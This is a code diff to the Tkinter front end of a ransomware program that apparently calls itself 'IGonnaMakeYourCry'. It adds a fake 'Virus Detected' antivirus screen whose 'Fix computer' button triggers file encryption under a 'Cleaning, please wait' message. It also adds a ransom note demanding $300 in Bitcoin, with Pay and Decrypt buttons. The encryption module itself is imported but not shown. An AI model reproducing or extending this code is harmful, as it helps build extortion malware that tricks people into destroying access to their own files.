@@ -3,10 +3,13 @@ from tkinter import messagebox
 from ransom import Ransom
 from KeyManager import KeyManager
 from uuid import getnode as get_mac
+from PIL import Image, ImageTk
+import time
 
 
 #sudo apt-get install python3-tk
 #pyinstaller --onefile --hidden-import=tkinter  GUI.py
+#pip3 install Pillow
 
 
 
@@ -17,6 +20,8 @@ class GUI:
         self.window = None
         self.keyManager = KeyManager()
         self.ransom = Ransom()
+
+        
 
         if(self.keyManager.isEncrypted(get_mac())):
             self.loadEncrypted()
@@ -42,6 +47,9 @@ class GUI:
 
 
     def encrypt(self):
+        lbl = Label(self.window, text="Cleaning, please wait...", font=('Helvetica 12 bold', 15))
+        lbl.grid(column=0, row=1)
+        self.window.update()
         self.ransom.encrypt()
         self.window.destroy()
         self.loadEncrypted()
@@ -51,17 +59,47 @@ class GUI:
     def loadEncrypted(self):
         self.window = Tk()
 
-        self.window.title("Welcome to IGonnaMakeYourCry")
-        self.window.geometry('350x200')
+        self.window.title("IGonnaMakeYourCry")
+        self.window.geometry('500x400')
+        self.window.configure(background = 'firebrick')
 
-        lbl = Label(self.window, text="Ooops, your files have been encrypted! :(")
-        lbl.grid(column=0, row=0)
 
-        btn = Button(self.window, text="Pay", command=self.pay)
-        btn.grid(column=0, row=1)
+        #lbl = Label(self.window, text="Ooops, your computer is infected. Press button to fix.")
+        #Grid.columnconfigure(self.window, 0, weight=1)
+        #lbl.grid(row=0,column = 0, pady=10)
 
-        btn = Button(self.window, text="Decrypt", command=self.decrypt)
-        btn.grid(column=1, row=1)
+        lbl = Label(self.window, text="Woops, looks like you are in trouble!", bg = 'gold', fg = 'black', font='Helvetica 12 bold')
+        Grid.columnconfigure(self.window, 0, weight=1)
+        Grid.columnconfigure(self.window, 1, weight=1)
+        lbl.grid(row=0,column = 0, pady=10, columnspan=2)
+
+        """Woops, looks like you are in trouble!
+What the hell just happened?
+-  Some of your files have been encrypted.
+Can I get my files back?
+- Yes, but it will cost you. You will need to pay 300$ worth of Bitcoins in order to decrypt your files. Once you have payed you need to press the "Decrypt" button and your files will be decrypted.
+How do I pay?
+- Simple, just press the pay button down below."""
+
+
+        t = Text(self.window,width=60, height=15, bg = 'gold')
+        t.tag_configure('bold', font='Helvetica 12 bold')
+
+        t.insert('end', 'What the hell just happened? \n', 'bold')
+        t.insert('end', 'Some of your files have been encrypted. \n \n', )
+        t.insert('end', 'Can I get my files back? \n', 'bold')
+        t.insert('end', 'Yes, but it will cost you. You will need to pay 300$ worth of Bitcoins in order to decrypt your files. Once you have payed you need to press the "Decrypt" button and your files will be decrypted. \n \n', )
+        t.insert('end', 'How do I pay? \n', 'bold')
+        t.insert('end', 'Simple, just press the pay button down below.', )
+        t.configure(state='disabled')
+        t.grid(row=1,column = 0, pady=10, columnspan=2)
+
+
+        btn1 = Button(self.window, text="Pay", command=self.pay, bg = 'gold', fg = 'black',font='Helvetica 12 bold')
+        btn1.grid(row=2,column = 0, pady=10)
+
+        btn2 = Button(self.window, text="Decrypt", command=self.decrypt, bg = 'gold', fg = 'black', font='Helvetica 12 bold')
+        btn2.grid(row=2,column = 1, pady=10)
 
         self.window.mainloop()
 
@@ -70,13 +108,23 @@ class GUI:
         self.window = Tk()
 
         self.window.title("Virus Detected")
-        self.window.geometry('350x200')
+        self.window.geometry('400x330')
+        self.window.configure(background = 'lightskyblue')
+        
 
-        lbl = Label(self.window, text="Ooops, your computer is infected. Press button to fix.")
-        lbl.grid(column=0, row=0)
+        lbl = Label(self.window, text="Looks like your computer is infected.\n Run this program to get rid of the virus.", font='Helvetica 12 bold')
+        Grid.columnconfigure(self.window, 0, weight=1)
+        lbl.grid(row=0,column = 0, pady=10)
 
-        btn = Button(self.window, text="Fix computer", command=self.encrypt)
-        btn.grid(column=0, row=1)
+        img = Image.open("shield.png")
+        render = ImageTk.PhotoImage(img)
+        img = Label(self.window, image=render)
+        img.image = render
+        img.grid(row = 1, column = 0)
+    
+
+        btn = Button(self.window, text="Fix computer", command=self.encrypt, font='Helvetica 12 bold')
+        btn.grid(row=2, column = 0, pady=10)
 
         self.window.mainloop()
 
